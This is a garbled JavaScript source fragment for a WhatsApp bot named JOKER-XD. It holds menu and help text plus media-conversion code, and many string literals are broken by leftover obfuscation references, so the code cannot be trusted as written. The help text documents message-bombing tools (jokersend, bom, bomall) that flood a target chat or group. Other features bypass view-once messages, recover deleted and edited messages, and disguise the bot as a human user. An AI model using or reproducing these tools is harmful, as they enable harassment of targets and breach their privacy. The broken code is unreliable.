  const alt = c.participantAlt || c.remoteJidAlt || "_0x750c7afa(_0x3c7d8f2f[405])@s.whatsapp.net_0x750c7afa(_0x3c7d8f2f[406])_0x750c7afa(_0x3c7d8f2f[407])_0x750c7afa(_0x3c7d8f2f[408])_0x750c7afa(_0x3c7d8f2f[409])ban.json_0x750c7afa(_0x3c7d8f2f[410])mode.json_0x750c7afa(_0x3c7d8f2f[411])private_0x750c7afa(_0x3c7d8f2f[412])private","public","dm","group_0x750c7afa(_0x3c7d8f2f[413])private_0x750c7afa(_0x3c7d8f2f[414])private_0x750c7afa(_0x3c7d8f2f[415])dm_0x750c7afa(_0x3c7d8f2f[416])group_0x750c7afa(_0x3c7d8f2f[417])Goodbye 👋 Nice to meet you all!_0x750c7afa(_0x3c7d8f2f[387])Take care everyone! See you again 👋_0x750c7afa(_0x3c7d8f2f[387])Leaving this group — stay awesome!_0x750c7afa(_0x3c7d8f2f[387])Goodbye everyone 🫩 Have a great day!_0x750c7afa(_0x3c7d8f2f[387])It was nice being here. See you soon!_0x750c7afa(_0x3c7d8f2f[418])_0x750c7afa(_0x3c7d8f2f[419])_0x750c7afa(_0x3c7d8f2f[420])mex" query ids. WhatsApp rotates them; a wrong/old id simply
// fails (harmless read-only query) and the resolver moves on to the next fallback.

  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(`${label} timed out after ${Math.round(ms / 1000)}s`)), ms);
    Promise.resolve(p).then(
      (v) => { clearTimeout(t); resolve(v); },
      (e) => { clearTimeout(t); reject(e); }
    );
  });
}
  return String((e && (e.message || e.output?.payload?.message)) || e || "unknown error_0x750c7afa(_0x3c7d8f2f[260]) _0x750c7afa(_0x3c7d8f2f[421])parse_0x750c7afa(_0x3c7d8f2f[422])timeout_0x750c7afa(_0x3c7d8f2f[423])ratelimit_0x750c7afa(_0x3c7d8f2f[424])closed_0x750c7afa(_0x3c7d8f2f[425])forbidden_0x750c7afa(_0x3c7d8f2f[426])unsupported_0x750c7afa(_0x3c7d8f2f[427])notfound_0x750c7afa(_0x3c7d8f2f[264])other_0x750c7afa(_0x3c7d8f2f[428])other_0x750c7afa(_0x3c7d8f2f[429])_0x750c7afa(_0x3c7d8f2f[430])_0x750c7afa(_0x3c7d8f2f[431])_0x750c7afa(_0x3c7d8f2f[432])${jm[1]}@newsletter_0x750c7afa(_0x3c7d8f2f[433])${s}@newsletter_0x750c7afa(_0x3c7d8f2f[434])${m[1]}@newsletter_0x750c7afa(_0x3c7d8f2f[435])"${m[1]}"_0x750c7afa(_0x3c7d8f2f[436])${m[1]}@newsletter_0x750c7afa(_0x3c7d8f2f[437])${m[1]}@newsletter_0x750c7afa(_0x3c7d8f2f[438])mex error ${er.extensions?.error_code || er.code || ""} ${er.message || ""}_0x750c7afa(_0x3c7d8f2f[439])https://whatsapp.com/channel/${encodeURIComponent(code)}_0x750c7afa(_0x3c7d8f2f[440])${a.step}:${a.ok}_0x750c7afa(_0x3c7d8f2f[441])${a.step} ${a.ok ? "✔" : "✖"}_0x750c7afa(_0x3c7d8f2f[442])❌ *${title}*_0x750c7afa(_0x3c7d8f2f[443])*Reason:* ${CH_KIND_REASON[kind] || CH_KIND_REASON.other}_0x750c7afa(_0x3c7d8f2f[444])*Tried:* ${chTriedLine(attempts)}_0x750c7afa(_0x3c7d8f2f[445])*Details:* ${String(firstErr.err).slice(0, 160)}_0x750c7afa(_0x3c7d8f2f[446])${i + 1}. ${t}_0x750c7afa(_0x3c7d8f2f[447])📣 *${r.name || _0x750c7afa(_0x3c7d8f2f[448])}*_0x750c7afa(_0x3c7d8f2f[449])🆔 ${r.jid}_0x750c7afa(_0x3c7d8f2f[450])👥 Followers: ${Number(r.subscribers).toLocaleString(_0x750c7afa(_0x3c7d8f2f[451]))}_0x750c7afa(_0x3c7d8f2f[452])🔗 https://whatsapp.com/channel/${inv}_0x750c7afa(_0x3c7d8f2f[453])⚠️ ${r.note}_0x750c7afa(_0x3c7d8f2f[454])${d}d ${h}h ${m}m ${sec}s_0x750c7afa(_0x3c7d8f2f[455])
┏┅┅┅┅┅┅┅┓
┇ 🃏*${botName}*
┗┅┅┅┅┅┅┅┛

✦ *Bot*       : ${botName}
✦ *Owner*     : ${ownerName}
✦ *Version*   : v2.0.7
✦ *Prefix*    : ${prefix === "" ? _0x750c7afa(_0x3c7d8f2f[456]) : prefix}
✦ *Mode*      : ${mode}
✦ *User*      : @${name}
✦ *Uptime*    : ${uptime}
✦ *Developer* : 𝓩ₐᵢₙ ₘₐᵣₜₑₙ ⱼₒₖₑᵣ

─────────────
─────────────

┏━⚡ MAIN
┃ ➤ 📋 menu
┃ ➤ 🏓 ping
┃ ➤ 💚 alive
┃ ➤ ❓ help
┃ ➤ ⚙️ settings
┃ ➤ ⚙️ setting
┗━━━━━━━━━━━━━━━━

┏━🔗 SHARE BOT
┃ ➤ /connect
┃ ➤ /connect list
┃ ➤ /disconnect
┃ ➤ /disconnect all
┗━━━━━━━━━━━━━━━━

┏━🤖 AI
┃ ➤ 🧠 ai
┃ ➤ 🌐 translate
┃ ➤ 🎨 imagine
┃ ➤ 💬 chatbot
┗━━━━━━━━━━━━━━━━

┏━🃏 xd-Spam tools
┃ ➤ 🎯 jokersend
┃ ➤ 🏷️ jokertag
┃ ➤ 📢 jokerall
┃ ➤ 💣 bom
┃ ➤ 💣 bomall
┃ ➤ 💣 bomtag
┃ ➤ ⏹ stop
┃ ➤ 🆘 jokerhelp
┗━━━━━━━━━━━━━━━━

┏━👑 OWNER
┃ ➤ 🆔 jid
┃ ➤ 📋 alljid
┃ ➤ 📢 chjid
┃ ➤ 📢 chaneljid
┃ ➤ 📢 unfollow
┃ ➤ 📌 keep
┃ ➤ 🚫 ban
┃ ➤ ✅ unban
┃ ➤ 📋 banlist
┃ ➤ 🗑️ clearban
┃ ➤ 🚫 block
┃ ➤ ✅ unblock
┃ ➤ 📋 blocklist
┃ ➤ 📢 broadcast
┃ ➤ 👑 sudo
┃ ➤ ❌ delsudo
┃ ➤ 🔄 mode
┃ ➤ 🗑️ delete
┃ ➤ 👋 left
┃ ➤ ➕ join
┃ ➤ 📊 groups
┃ ➤ ➕ chatbotadd
┃ ➤ ❌ chatbotrem
┃ ➤ ✏️ setbotname
┃ ➤ ✏️ setownername
┃ ➤ 🔧 setprefix
┗━━━━━━━━━━━━━━━━

┏━👥 GROUP
┃ ➤ 🦵 kick
┃ ➤ 👢 kickall
┃ ➤ ⬆️ promote
┃ ➤ ⬇️ demote
┃ ➤ 📢 tagall
┃ ➤ 👑 admin
┃ ➤ 👥 members
┃ ➤ 🙈 hidetag
┃ ➤ 🔗 link
┃ ➤ 🔄 resetlink
┃ ➤ 🔓 open
┃ ➤ 🔒 close
┃ ➤ 📝 setdesc
┃ ➤ ✏️ setname
┃ ➤ 👋 welcome
┃ ➤ ✏️ setwelcome
┃ ➤ 👋 goodbye
┃ ➤ ✏️ setgoodbye
┃ ➤ 🚫 antilink
┃ ➤ 🚫 antichannel
┃ ➤ 🚫 antistic
┃ ➤ 🚫 antivoice
┃ ➤ 🚫 antipic
┃ ➤ 🚫 antivideo
┃ ➤ 🚫 antitext
┃ ➤ 🚫 antitag
┃ ➤ 🚫 antitagme
┃ ➤ 📢 all
┃ ➤ 🌐 seeweb
┃ ➤ 🤖 antibot
┃ ➤ 🛡️ antibug
┃ ➤ 🕵️ hidemybot
┃ ➤ 🔍 whois
┃ ➤ 🚫 antigroupmention / agm
┃ ➤ 📱 gstatus / togstatus
┃ ➤ 📱 xds / xd gstatus
┃ ➤ 🚫 antigroupstatus / ags
┃ ➤ 🛡️ antideletestatus
┃ ➤ 💾 save
┃ ➤ 📤 send
┃ ➤ 👀 autostatusview
┃ ➤ ❤️ react
┃ ➤ 👥 groupadd
┃ ➤ 🖼️ getpp
┃ ➤ 🖼️ gcpp / gcp
┃ ➤ ⚠️ warn
┃ ➤ ⚠️ setwarn
┃ ➤ 🔄 resetwarn
┃ ➤ ✅ allow
┃ ➤ ✅ approve
┃ ➤ ✅ approveall
┗━━━━━━━━━━━━━━━━

┏━🎮 GAMES
┃ ➤ 🎮 games
┃ ➤ 🐍 snake / tetris / flappy ...
┗━━━━━━━━━━━━━━━━

┏━📥 DOWNLOAD
┃ ➤ 🎵 song
┃ ➤ 🎬 video
┃ ➤ 🔍 yts
┃ ➤ 📘 facebook
┃ ➤ 🎵 fbaudio
┃ ➤ 📸 instagram
┃ ➤ 🎵 igaudio
┃ ➤ 🎵 tiktok
┃ ➤ 🎵 ttaudio
┃ ➤ 🐦 twitter
┃ ➤ 📌 pinterest
┃ ➤ 📌 pin
┃ ➤ 🔞 adultmenu
┗━━━━━━━━━━━━━━━━

┏━✨ AUTO
┃ ➤ 😊 autoreact
┃ ➤ 🔄 setreact
┃ ➤ 📱 autostatus
┃ ➤ 📖 autoread
┃ ➤ 🎙️ autorecord
┃ ➤ ⌨️ autotype
┃ ➤ 🎙️ autorectype
┃ ➤ 📶 alwaysonline
┃ ➤ 🗑️ antidelete
┃ ➤ ✏️ antiedit
┃ ➤ 📶 online
┃ ➤ 👀 lastseen
┗━━━━━━━━━━━━━━━━

┏━🔄 CONVERT
┃ ➤ 🎵 tomp3
┃ ➤ 🎤 tovoice
┃ ➤ 🖼️ sticker
┃ ➤ 🖼️ toimg
┃ ➤ 🎬 tovideo
┃ ➤ 📢 tts
┃ ➤ 🔗 url
┃ ➤ 📖 readmore
┗━━━━━━━━━━━━━━━━

══════════════
💡 Type ${prefix}help for short usage
🃏 JOKER-XD v2.0.5
_0x750c7afa(_0x3c7d8f2f[457])
*📖 HELP — short usage*

*MAIN*
• ${p}menu — full menu
• ${p}ping — bot speed
• ${p}alive — uptime / status
• ${p}help — this list

*SHARE BOT* (slash / only — Bot King / Owner / Developer)
• /connect <number> — pair a shared bot (pairing code)
• /connect list — list numbers you shared
• /disconnect <number> — remove *child* bot only (King never affected)
• /disconnect all — remove all *child* bots only (King never affected)

*AI*
• ${p}ai <question> — ask AI
• ${p}translate / tr <lang> <text>
• ${p}imagine <prompt> — AI image
• ${p}chatbot on|off — AI reply only on @mention or reply-to-bot (any mode)

*xd-Spam tools*
• ${p}jokersend [delay] jid text amount — spam target
• ${p}jokertag num [delay] jid text amount — tag+spam
• ${p}jokerall [delay] jid text amount — group hidetag spam
• ${p}bom [#delay] amount — reply spam (max 500)
• ${p}bom [#delay] message amount — text spam without reply
• ${p}bomall [#delay] amount|message amount — group hidetag spam
• ${p}bomtag [#delay] number amount|message amount — tag spam
• ${p}stop bom|ba|bt|all — stop running bom/joker jobs
• ${p}jokerhelp — full guide


*CONVERT*
• ${p}sticker / s — image/video/gif/sticker → sticker (Joker-xd)
• ${p}take Pack|Author — change sticker pack/author (either ok)
• ${p}tag <text> — delete cmd + silent hidetag (or reply any msg)
• ${p}setpp — set profile picture (owner, reply image)
• ${p}setpname <name> — set profile name (owner)
• ${p}hello on|off — auto-reply _0x750c7afa(_0x3c7d8f2f[458]) to others' hello
• ${p}toimage — reply sticker → image
• ${p}tomp3 — reply video/audio → mp3
• ${p}tovoice / tov / topp — reply video/audio/voice → voice note
• ${p}tomp4 — reply sticker/image

*TOOLS*
• ${p}tts <text> — text to speech
• ${p}translate / tr <lang> <text> — translate
• ${p}url / upload — reply media → Catbox link
• ${p}readmore visible.hidden — spoiler (dot separator)
• ${p}define <word> — dictionary
• ${p}weather <city> — weather
• ${p}currency <amount> <from> <to> — exchange
• ${p}qr <text> — QR code image

*GROUP*
• ${p}kick / k / out / nikul / dufa / remove — kick member (reply/num)
• ${p}kickall — kick non-admins (owner)
• ${p}promote / toadmin — make admin
• ${p}demote / dismiss / tomember — remove admin
• ${p}tag — silent hidetag (text or reply any media/text/sticker/voice)
• ${p}tagall — tag all with numbers visible
• ${p}admin — tag only admins + numbers
• ${p}members — tag only members + numbers
• ${p}hidetag / ht — same as .tag (silent + reply support)
• ${p}link / resetlink — invite link
• ${p}open / close — unlock / lock group
• ${p}setdesc / setgroupname — edit group
• ${p}antilink warn|delete|kick|off — link protection (one mode, switches)
• ${p}antichannel warn|delete|kick|off — block forwarded channel posts
• ${p}antisticker|antipic|antivideo|antivoice|antitext warn|delete|kick|off
• ${p}antitag warn|delete|kick on|off — mass tag protection (visible + hidden tags)
• ${p}antitagme on|off|set text
• ${p}all [message] — tag everyone with @all (in DM: ${p}all <groupJid> [message])
• ${p}seeweb <link> — open a website inside the chat (view only)
• ${p}antibot warn|delete|kick|off — detect & punish other bots
• ${p}antibug on|warn|kick|off — crash/bug message shield
• ${p}hidemybot on|off|typing on|off — make this bot look like a phone user
• ${p}whois [number|@user|reply] — profile card
• ${p}antigroupmention / agm warn|delete|kick|off — anti group-status *mentions* only
• ${p}gstatus / togroupstatus / togstatus [jid] text|reply — post group status
• ${p}xds / xd gstatus [jid] <tiktok|yt|ig|fb link> — download video → group status
• ${p}antigroupstatus / ags warn|delete|kick|off — anti real group-status posts only
• ${p}antideletestatus / ads on|off — recover deleted group status/mention → your private
• ${p}save — reply group status/media → send to your private
• ${p}send — reply status/media → extract & send same content here
• ${p}autostatusview / asv on|off — auto-seen ALL status (personal + group + mentions)
• ${p}react / autostatusreact on|off — auto ❤️ ALL status types
• ${p}autoreact status on|off — same as status react via autoreact
• ${p}groupadd all|contacts|contact_blacklist — who can add bot to groups
• ${p}welcome on|off — enable/disable welcome for this group
• ${p}setwelcome <text> — set welcome template ({@username} {group})
• ${p}goodbye on|off — enable/disable goodbye for this group
• ${p}setgoodbye <text> — set goodbye template ({@username} {group})
• ${p}getpp — get user profile picture (reply/mention/number)
• ${p}gcpp / gcp — get current group profile picture + name
• ${p}warn — warn user (limit → kick)
• ${p}setwarn 1-5 — warn limit
• ${p}resetwarn / rw — clear warns
• ${p}allow — 1 free violation
• ${p}approve all — approve pending join requests up to the 1025-member ceiling
• ${p}approve <amount> — approve a specific number of pending requests

*GAMES* (in-chat arcade)
• ${p}games — list all 20 games
• ${p}snake ${p}tetris ${p}flappy ${p}dino ${p}2048 ...
• ${p}sonic ${p}pesawat ${p}pong ${p}breakout ${p}stack
• ${p}slot ${p}mines ${p}slide ${p}lights ${p}simon ${p}hangman ${p}quiz
• ${p}whack ${p}reaction ${p}tapspeed

*DOWNLOAD* (direct media, no loading text)
• ${p}song <name/url> — YT audio
• ${p}play <name/url> — song card + audio (one message)
• ${p}song <name> doc / ${p}video <name> doc — send as document
• ${p}ytmp3 <name/url> — YT audio
• ${p}music <name/url> — YT audio
• ${p}video|ytmp4 <name/url> — YouTube video
• ${p}yts <query> — YouTube search
• ${p}facebook|fb <url> — Facebook video
• ${p}facebookaudio|fbaudio <url>
• ${p}instagram|ig|insta <url>
• ${p}instagramaudio|igaudio|instaaudio <url>
• ${p}tiktok|tt <url>
• ${p}tiktokaudio|ttaudio <url>
• ${p}twitter <url>
• ${p}pinterest <url>
• ${p}pin <amount> <query> — Pinterest pictures
• ${p}adultmenu — adult commands

*MEDIA*
• ${p}vv — open view-once here
• ${p}vv2 — view-once → owner DM (silent no-prefix reply)
• ${p}viewone / antiviewonce on|off|dm|here — auto-forward view-once (OFF by default). React on a view-once: 🐲 = open here, any other emoji = owner DM
• ${p}gcp / gcpp / getpp — group / user photo
• ${p}setmenuimage — reply image as menu pic

*AUTO*
• ${p}autoreact all|dm|group|command on|off
• ${p}autoreact on|off — master switch
• ${p}setreact default|ai|all|custom <emojis>
• ${p}setreact ❤️🔥😂 — custom pool

• ${p}autorecord dm|group on|off
• ${p}autotype dm|group on|off
• ${p}autorecordtype dm|group on|off
• ${p}antidelete private|chat|off — recover deleted messages
• ${p}antiedit pm|chat|off — recover original text of edited messages (default ON → owner DM)

*MODE*
• ${p}mode public|dm|group|private

*OWNER*
• ${p}ban / unban / banlist / clearban
• ${p}block / unblock / blocklist
• ${p}broadcast / bc <msg> — list groups, reply *1,2,5* or *all*
• ${p}sudo / delsudo
• ${p}delete / del / det — reply delete; premium: .delete last N
• ${p}left / join <link> / groups
• ${p}jid / alljid / chjid / chaneljid
• ${p}unfollow ch — list followed channels; then *${p}keep 1,2,6* (keep these, unfollow rest) / *${p}unfollow 2,3,6* / *${p}unfollow all* (or *${p}all unfollow*)
• ${p}chatbotadd / chatbotrem
• ${p}setbotname / setownername / setprefix
• ${p}online / lastseen

Developer prefix: *®* (always works)
`.trim();
}

  const p = prefix || ".";
  return `
*🃏 JOKER TOOLS GUIDE*

*Delay* (optional): #500ms → #72h
Examples: #500ms  #1sec  #2s  #1min

*${p}jokersend* — send text or media to a target
Without delay:
  ${p}jokersend (jid) (message) (amount)
With delay:
  ${p}jokersend #1sec (jid) (message) (amount)
Reply media:
  ${p}jokersend (jid) (amount)
  ${p}jokersend #1sec (jid) (amount)

*${p}jokertag* — tag a number while sending
Without delay:
  ${p}jokertag (number) (jid) (message) (amount)
With delay:
  ${p}jokertag (number) #1sec (jid) (message) (amount)
Reply media:
  ${p}jokertag (number) (jid) (amount)

*${p}jokerall* — hidetag everyone in a group
Without delay:
  ${p}jokerall (jid) (message) (amount)
With delay:
  ${p}jokerall #1sec (jid) (message) (amount)
Reply media:
  ${p}jokerall (jid) (amount)

*${p}stop* — cancel a running joker job
  ${p}stop js   — stop jokers
  ${p}stop jt   — stop jokertag
  ${p}stop ja   — stop jokerall
  ${p}stop all  — stop everything
Aliases: ${p}stopjs ${p}stopjt ${p}stopja

JID formats: number@g.us | number@s.whatsapp.net | number@lid
`.trim();
}


// ==================== STICKER ====================
/** Default sticker pack branding — Joker-XD */

/**
 * Inject WhatsApp sticker EXIF (pack name + author) into a WebP buffer.
 * Pure JS — no extra dependency required.
 */
  const json = JSON.stringify({
    "sticker-pack-id": "com.jokerxd.bot",
    "sticker-pack-name": packname,
    "sticker-pack-publisher": author,
    "android-app-store-link": "https://t.me/martenzain",
    "ios-app-store-link": "https://t.me/martenzain",
    emojis: [""]
  });
  const jsonBuf = Buffer.from(json, "utf8");
  // EXIF header for WhatsApp stickers
  const exif = Buffer.concat([
    Buffer.from([
      0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
      0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00
    ]),
    jsonBuf
  ]);
  exif.writeUIntLE(jsonBuf.length, 14, 4);

  // Build a VALID extended WebP (VP8X + image data + EXIF).
  // WhatsApp shows a blank / "Can't view sticker information_0x750c7afa(_0x3c7d8f2f[459])ascii_0x750c7afa(_0x3c7d8f2f[460])RIFF_0x750c7afa(_0x3c7d8f2f[461])ascii_0x750c7afa(_0x3c7d8f2f[462])WEBP_0x750c7afa(_0x3c7d8f2f[463])ascii_0x750c7afa(_0x3c7d8f2f[464])ascii_0x750c7afa(_0x3c7d8f2f[465])VP8X_0x750c7afa(_0x3c7d8f2f[466])VP8X_0x750c7afa(_0x3c7d8f2f[467])VP8 _0x750c7afa(_0x3c7d8f2f[468])VP8L_0x750c7afa(_0x3c7d8f2f[469])VP8 _0x750c7afa(_0x3c7d8f2f[470])VP8L_0x750c7afa(_0x3c7d8f2f[471])ALPH_0x750c7afa(_0x3c7d8f2f[472])VP8X_0x750c7afa(_0x3c7d8f2f[473])VP8X_0x750c7afa(_0x3c7d8f2f[474])EXIF_0x750c7afa(_0x3c7d8f2f[475])VP8X_0x750c7afa(_0x3c7d8f2f[476])EXIF_0x750c7afa(_0x3c7d8f2f[477])RIFF_0x750c7afa(_0x3c7d8f2f[478])WEBP", 8);
  body.copy(out, 12);
  return out;
}

/**
 * Make WhatsApp sticker from image / video / gif / existing sticker.
 * WhatsApp animated stickers must be WebP ≤512×512 (platform limit — not optional).
 */
  const id = makeId();
  const output = path.join(MEDIA_DIR, `${id}.webp`);
  const pack = packname || STICKER_PACK_NAME;
  const auth = author || STICKER_PACK_AUTHOR;

  // Magic-byte detect
  let ext = isVideo ? ".mp4_0x750c7afa(_0x3c7d8f2f[63]).jpg_0x750c7afa(_0x3c7d8f2f[479]).png_0x750c7afa(_0x3c7d8f2f[480]).jpg_0x750c7afa(_0x3c7d8f2f[481]).gif_0x750c7afa(_0x3c7d8f2f[482])ascii_0x750c7afa(_0x3c7d8f2f[483])ftyp_0x750c7afa(_0x3c7d8f2f[484]).mp4_0x750c7afa(_0x3c7d8f2f[485])ascii_0x750c7afa(_0x3c7d8f2f[486])RIFF_0x750c7afa(_0x3c7d8f2f[487])ascii_0x750c7afa(_0x3c7d8f2f[488])WEBP_0x750c7afa(_0x3c7d8f2f[489]).webp_0x750c7afa(_0x3c7d8f2f[490])ANIM_0x750c7afa(_0x3c7d8f2f[491])ANMF_0x750c7afa(_0x3c7d8f2f[492]).gif_0x750c7afa(_0x3c7d8f2f[493]).mp4_0x750c7afa(_0x3c7d8f2f[494])contain_0x750c7afa(_0x3c7d8f2f[495])[sticker] sharp failed, ffmpeg:_0x750c7afa(_0x3c7d8f2f[496]).webp_0x750c7afa(_0x3c7d8f2f[497])contain_0x750c7afa(_0x3c7d8f2f[498])[sticker] sharp animated webp failed:", eSharpAnim.message || eSharpAnim);
        // fall through to ffmpeg (will likely fail, but try)
      }
    }

    // Animated gif / video / fallback → ffmpeg
    const input = path.join(MEDIA_DIR, `${id}_in${ext}`);
    fs.writeFileSync(input, buffer);
    try {
      if (isAnim || ext === ".gif_0x750c7afa(_0x3c7d8f2f[499]).mp4_0x750c7afa(_0x3c7d8f2f[499]).webp_0x750c7afa(_0x3c7d8f2f[500])${FFMPEG_PATH}_0x750c7afa(_0x3c7d8f2f[501])${input}_0x750c7afa(_0x3c7d8f2f[502])scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=black@0_0x750c7afa(_0x3c7d8f2f[503])${output}_0x750c7afa(_0x3c7d8f2f[504])${FFMPEG_PATH}_0x750c7afa(_0x3c7d8f2f[501])${input}_0x750c7afa(_0x3c7d8f2f[505])scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=black@0_0x750c7afa(_0x3c7d8f2f[506])${output}_0x750c7afa(_0x3c7d8f2f[507])Empty output — host ffmpeg may lack libwebp (need: apt install ffmpeg)_0x750c7afa(_0x3c7d8f2f[508])Sticker failed: " + (e.message || e));
  }
}

/** Mutex — only 1 conversion at a time */
  return new Promise((resolve) => {
    if (!_tovideoBusy) {
      _tovideoBusy = true;
      resolve();
    } else {
      _tovideoWaiters.push(resolve);
    }
  });
}
  const next = _tovideoWaiters.shift();
  if (next) next();
  else _tovideoBusy = false;
}


/**
 * LOCAL method (Sharp frames → FFmpeg)
 * Joker-XD style — used by .tovideo / .tomp4
 * No size limit — original sticker width/height kept as-is.
 * Only makes dimensions even (libx264 / yuv420p requirement).
 */
  const id = makeId();
  const input = path.join(MEDIA_DIR, `${id}_sticker.webp`);
  const framesDir = path.join(MEDIA_DIR, `${id}_frames`);
  const output = path.join(MEDIA_DIR, `${id}_sticker.mp4`);
  fs.writeFileSync(input, buffer);
  fs.mkdirSync(framesDir, { recursive: true });
  try {
    const meta = await sharp(buffer, { animated: true }).metadata();
    const pages = Math.max(1, meta.pages || 1);
    const delays = meta.delay || [];
    let avgDelay = delays.length
      ? delays.reduce((a, b) => a + b, 0) / delays.length
      : 100;
    avgDelay = Math.max(20, Math.min(500, avgDelay));
    const fps = Math.max(5, Math.min(30, Math.round(1000 / avgDelay))) || 10;

    let written = 0;
    for (let i = 0; i < pages; i++) {
      const framePath = path.join(
        framesDir,
        `frame_${String(i).padStart(4, "0_0x750c7afa(_0x3c7d8f2f[509])fill",
            background: { r: 0, g: 0, b: 0, alpha: 1 }
          })
          .flatten({ background: { r: 0, g: 0, b: 0 } })
          .jpeg({ quality: 90 })
          .toBuffer();

        fs.writeFileSync(framePath, frameBuf);
        written++;
      } catch (fe) {
        console.warn(`[tovideo] frame ${i} skip:`, fe.message || fe);
      }
    }

    if (written < 1) throw new Error("local: no frames extracted_0x750c7afa(_0x3c7d8f2f[510])scale=trunc(iw/2)*2:trunc(ih/2)*2,format=yuv420p_0x750c7afa(_0x3c7d8f2f[511])${FFMPEG_PATH}" -y -framerate ${fps} -i "${framesDir}/frame_%04d.jpg_0x750c7afa(_0x3c7d8f2f[505])${vf}_0x750c7afa(_0x3c7d8f2f[512])${output}_0x750c7afa(_0x3c7d8f2f[513])local: empty mp4_0x750c7afa(_0x3c7d8f2f[514])Sticker→video conversion failed_0x750c7afa(_0x3c7d8f2f[515])[tovideo] OK via local-sharp, size=_0x750c7afa(_0x3c7d8f2f[516])contain", background: { r: 0, g: 0, b: 0, alpha: 0 } })
      .png()
      .toBuffer();
  } catch (e1) {
    const id = makeId();
    const input = path.join(MEDIA_DIR, `${id}_sticker.webp`);
    const output = path.join(MEDIA_DIR, `${id}_sticker.png`);
    fs.writeFileSync(input, buffer);
    try {
      await execAsync(
        `"${FFMPEG_PATH}_0x750c7afa(_0x3c7d8f2f[501])${input}_0x750c7afa(_0x3c7d8f2f[517])${output}_0x750c7afa(_0x3c7d8f2f[518])Sticker→image conversion failed_0x750c7afa(_0x3c7d8f2f[519])._0x750c7afa(_0x3c7d8f2f[520])_0x750c7afa(_0x3c7d8f2f[521])image/jpeg_0x750c7afa(_0x3c7d8f2f[522])image/jpeg_0x750c7afa(_0x3c7d8f2f[523])image/png_0x750c7afa(_0x3c7d8f2f[524])image/webp_0x750c7afa(_0x3c7d8f2f[525])image/gif_0x750c7afa(_0x3c7d8f2f[526])video/mp4_0x750c7afa(_0x3c7d8f2f[527])video/x-matroska_0x750c7afa(_0x3c7d8f2f[528])video/webm_0x750c7afa(_0x3c7d8f2f[529])video/quicktime_0x750c7afa(_0x3c7d8f2f[530])audio/mpeg_0x750c7afa(_0x3c7d8f2f[531])audio/ogg_0x750c7afa(_0x3c7d8f2f[532])audio/ogg_0x750c7afa(_0x3c7d8f2f[533])audio/mp4_0x750c7afa(_0x3c7d8f2f[534])audio/aac_0x750c7afa(_0x3c7d8f2f[535])application/pdf_0x750c7afa(_0x3c7d8f2f[536])application/zip_0x750c7afa(_0x3c7d8f2f[537])application/octet-stream_0x750c7afa(_0x3c7d8f2f[538])application/octet-stream_0x750c7afa(_0x3c7d8f2f[539])Empty or invalid buffer_0x750c7afa(_0x3c7d8f2f[540])https://catbox.moe/user/api.php_0x750c7afa(_0x3c7d8f2f[541])catbox_0x750c7afa(_0x3c7d8f2f[542])https://litterbox.catbox.moe/resources/internals/api.php_0x750c7afa(_0x3c7d8f2f[541])litterbox_0x750c7afa(_0x3c7d8f2f[543])72h_0x750c7afa(_0x3c7d8f2f[544])https://upload.satoru.click/user/api.php_0x750c7afa(_0x3c7d8f2f[541])satoru_0x750c7afa(_0x3c7d8f2f[545])reqtype_0x750c7afa(_0x3c7d8f2f[82])fileupload_0x750c7afa(_0x3c7d8f2f[546])fileToUpload_0x750c7afa(_0x3c7d8f2f[547])Content-Type_0x750c7afa(_0x3c7d8f2f[87])multipart/form-data_0x750c7afa(_0x3c7d8f2f[548])_0x750c7afa(_0x3c7d8f2f[549])<html") && url.length < 500) {
        return url;
      }
      lastErr = new Error(`${host.name} returned: ${url.slice(0, 120) || res.status}`);
    } catch (e) {
      lastErr = e;
      console.warn(`[upload] ${host.name} failed:`, e.message || e);
    }
  }
  throw new Error("Upload failed on all hosts: _0x750c7afa(_0x3c7d8f2f[550])unknown_0x750c7afa(_0x3c7d8f2f[551])Unknown";
  try {
    if (isGroup(jid)) {
      const meta = await getCachedMeta(sock, jid).catch(() => null);
      if (meta?.subject) return `${meta.subject} (${jid})`;
      return `Group: ${jid}`;
    }
    const num = jidNumber(jid);
    return num ? `DM: +${num}` : `Chat: ${jid}`;
  } catch {
    return String(jid);
  }
}

/** Stream media via downloadContentFromMessage (Zain-style, more reliable for view-once) */
  const stream = await downloadContentFromMessage(mediaObj, type);
  let buffer = Buffer.from([]);
  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
  return buffer;
}

/** Open any view-once media (image / video / audio / sticker / document) → send payload
 *  Primary: downloadContentFromMessage (same as Zain antiviewonce)
 *  Fallback: downloadMediaMessage
 */
  const outer = sourceMsg.message || {};
  const vo = unwrapMessage(outer);
  const opts = { logger: pino({ level: "silent_0x750c7afa(_0x3c7d8f2f[552])[viewonce] stream fail, fallback:_0x750c7afa(_0x3c7d8f2f[553])buffer_0x750c7afa(_0x3c7d8f2f[554])[viewonce] both download methods failed:_0x750c7afa(_0x3c7d8f2f[555])image_0x750c7afa(_0x3c7d8f2f[556])_0x750c7afa(_0x3c7d8f2f[557])video_0x750c7afa(_0x3c7d8f2f[558])_0x750c7afa(_0x3c7d8f2f[559])audio_0x750c7afa(_0x3c7d8f2f[560])audio/ogg; 